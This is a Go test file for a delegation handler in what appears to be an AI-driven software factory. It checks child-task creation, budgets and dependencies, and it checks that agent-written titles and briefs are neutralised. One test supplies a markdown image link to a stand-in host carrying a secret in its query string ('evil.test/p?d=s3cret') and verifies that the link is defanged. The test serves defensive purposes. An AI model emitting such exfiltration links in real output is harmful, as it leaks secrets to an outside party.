package factoryd

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"

	"github.com/sebastianrueckerai/ai-software-factory-code/internal/policy"
)

// The delegate hand-over files the child in lane ready on the cheap rung,
// a small card of source delegate with the caller as its parent and its
// dependency, before the child's workflow starts; a caller that is not
// running is refused.
func TestDelegationFilesAChildWithADependency(t *testing.T) {
	rf := &rollForgejo{}
	fj, _ := rf.srv(t)
	store := newFakeStore()
	store.projects = []Project{seedProject("sf/ai-software-factory-code")}
	parent := Task{ID: "t-parent", Status: "running", Repository: "sf/ai-software-factory-code", IssueNumber: 41, Author: "sebastian", Priority: 2}
	if err := store.CreateTask(context.Background(), parent); err != nil {
		t.Fatal(err)
	}
	wf := &fakeWorkflows{}
	h := DelegationHandler(DelegationDeps{Store: store, Forgejo: fj, Workflows: wf, Timeline: nil,
		Budget: func() policy.Budget {
			return policy.Budget{TaskDefaultEUR: 5, TaskMaxEUR: 15, DayEUR: 20, MonthEUR: 50}
		}})
	post := func(body string) *httptest.ResponseRecorder {
		rr := httptest.NewRecorder()
		h(rr, httptest.NewRequest(http.MethodPost, "/internal/delegations", strings.NewReader(body)))
		return rr
	}
	rr := post(`{"task_id":"t-parent","title":"Add the index","brief":"In store.go add an index on tasks.rung; a test reads it."}`)
	if rr.Code != http.StatusCreated {
		t.Fatalf("status %d: %s", rr.Code, rr.Body)
	}
	var res struct {
		Issue  int64  `json:"issue"`
		TaskID string `json:"task_id"`
	}
	if err := json.Unmarshal(rr.Body.Bytes(), &res); err != nil || res.TaskID == "" || res.Issue == 0 {
		t.Fatalf("answer %s: %v", rr.Body, err)
	}
	child := store.tasks[res.TaskID]
	if child.Source != SourceDelegate || child.Parent != "t-parent" || child.Rung != RungCheap || child.Size != "small" || child.Lane != policy.LaneReady ||
		child.Status != "queued" || child.BudgetEUR != 2 || child.Priority != 2 || child.IssueNumber != res.Issue {
		t.Fatalf("child = %+v", child)
	}
	if !strings.HasPrefix(child.Objective, "Add the index\n\nDelegated by card #41 (t-parent)") || !strings.HasSuffix(child.Objective, "Size: small\nRung: cheap, delegated routine work") {
		t.Fatalf("objective = %q", child.Objective)
	}
	if !slices.Equal(store.deps[res.TaskID], []string{"t-parent"}) {
		t.Fatalf("deps = %v, want the parent", store.deps[res.TaskID])
	}
	if len(wf.started) != 1 || wf.started[0] != res.TaskID {
		t.Fatalf("workflows started %v, want the child's", wf.started)
	}
	if want := fmt.Sprintf("%d on 41", res.Issue); !slices.Equal(rf.deps, []string{want}) {
		t.Fatalf("issue dependencies = %v, want %q", rf.deps, want)
	}
	if rr := post(`{"task_id":"t-parent","title":"","brief":"x"}`); rr.Code != http.StatusBadRequest {
		t.Fatalf("empty title: %d", rr.Code)
	}
	store.tasks["t-parent"] = Task{ID: "t-parent", Status: "done", Repository: "sf/ai-software-factory-code"}
	if rr := post(`{"task_id":"t-parent","title":"x","brief":"y"}`); rr.Code != http.StatusConflict {
		t.Fatalf("a done parent: %d", rr.Code)
	}
}

// The delegated card's title and brief are the agent's: its issue carries
// them as an escalation does, no mention and no link off the allowlist
// live.
func TestDelegationNeutralisesTheAgentsText(t *testing.T) {
	rf := &rollForgejo{}
	fj, _ := rf.srv(t)
	fj.PublicURL = "https://git.example"
	store := newFakeStore()
	store.projects = []Project{seedProject("sf/ai-software-factory-code")}
	if err := store.CreateTask(context.Background(), Task{ID: "t-parent", Status: "running", Repository: "sf/ai-software-factory-code", IssueNumber: 41}); err != nil {
		t.Fatal(err)
	}
	h := DelegationHandler(DelegationDeps{Store: store, Forgejo: fj, Workflows: &fakeWorkflows{},
		Budget: func() policy.Budget {
			return policy.Budget{TaskDefaultEUR: 5, TaskMaxEUR: 15, DayEUR: 20, MonthEUR: 50}
		}})
	rr := httptest.NewRecorder()
	h(rr, httptest.NewRequest(http.MethodPost, "/internal/delegations", strings.NewReader(
		`{"task_id":"t-parent","title":"Add the index @mallory","brief":"See ![x](https://evil.test/p?d=s3cret) and https://git.example/sf/repo/issues/4."}`)))
	if rr.Code != http.StatusCreated {
		t.Fatalf("status %d: %s", rr.Code, rr.Body)
	}
	want := "Add the index ＠mallory\n\nDelegated by card #41 (t-parent): it starts when that card is done and builds on its merge.\n\n" +
		"See ![x](hxxps://evil[.]test/p?d=s3cret) and https://git.example/sf/repo/issues/4.\n\nSize: small\nRung: cheap, delegated routine work"
	if !slices.Equal(rf.issues, []string{want}) {
		t.Fatalf("issues %q, want %q", rf.issues, want)
	}
	// 255 characters, 257 once the link is defanged: the refusal says why
	rr = httptest.NewRecorder()
	h(rr, httptest.NewRequest(http.MethodPost, "/internal/delegations", strings.NewReader(
		`{"task_id":"t-parent","title":"`+strings.Repeat("a", 235)+` https://evil.test/x","brief":"b"}`)))
	if body := strings.TrimSpace(rr.Body.String()); rr.Code != http.StatusBadRequest || body != "the title is 257 characters once its links are defanged (hxxps://host[.]example), "+
		"past the 255 a title takes: shorten it or drop the links" || len(rf.issues) != 1 {
		t.Fatalf("a title the links push past 255 = %d %q, issues %d", rr.Code, body, len(rf.issues))
	}
}
